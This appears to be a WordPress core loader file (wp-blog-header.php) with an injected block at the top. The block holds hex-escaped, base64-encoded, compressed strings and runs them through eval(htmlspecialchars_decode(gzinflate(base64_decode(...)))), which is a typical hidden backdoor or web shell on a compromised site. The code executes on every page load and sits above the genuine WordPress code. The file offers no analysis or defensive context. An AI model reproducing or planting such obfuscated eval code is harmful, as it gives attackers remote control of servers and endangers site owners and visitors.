<?php
$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
$Lix = "\x3dEjw\x6236\x427O28\x43OrloW6qu28DwrPlhq6JOZ\x61huYLWtrqhoXTe6NXwzwSeUmstRjipPWoRUQ748MuV\x62d\x42ky/O8Ty0DWmWTqFhIpXGjSQpUTN6SiQ37SrpZ0\x42hWwE5JOo9qNE79zDtQyL\x63F48Ph\x63GFjr\x2bY1\x41jvVuefiF4D\x42ruS7\x41f5wNyXIv083e\x614f\x61q\x62xdD7sPe0Gh\x2b\x41pX6pLXLmtjhnd\x43HHEsNnVZPWew2hVr\x63wSM8m\x62PkV\x41PEWv\x42HPwm/nFRH\x63\x62sMDvSjIXfN8eQ3H\x2boX1g09y\x63zTH6j\x42vMgjEuSwUEwfHY9pLFehzG\x2bqj7/NUd/MTg3MnlP4qGVnRxZ0MVg35\x61U3qeVjjjTx\x621\x42xoGq\x43F\x41WeU/IIIlXTzQow4KNl\x427I\x63MKqWgdW\x43l\x2bZ9K\x61lnghYpUS\x43GRik5MrTfUeOwx9fmXyXESYLGteS95fYneot\x61z\x63rE\x62iSM0G\x622po4Wmdii5ni2ejPWs\x43\x43iyQ/Xw7GS\x42MDuWXS2o/gGwX\x42wJe\x2bXZ\x41qFg/QGw\x62\x42wJe\x2bXY\x416Fg/\x41Gwf\x42wJe\x2bXX\x41KGg/wFwj\x42wJe";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
?>

<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}
